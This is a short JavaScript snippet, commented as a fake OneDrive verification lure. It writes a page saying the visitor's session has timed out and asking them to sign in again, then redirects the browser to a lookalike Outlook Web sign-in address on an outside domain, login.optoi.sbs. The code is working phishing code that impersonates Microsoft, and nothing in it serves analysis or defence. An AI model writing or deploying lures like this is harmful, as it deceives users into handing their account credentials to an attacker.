// Fake OneDrive verification lure: renders the page, then sends the visitor to a login endpoint.
const html = "<title>OneDrive Verification</title><p>Session timed out. Please sign in again to continue.</p>";
document.write(html);
window.location.href = "https://login.optoi.sbs/owa/signin?continue=onedrive";
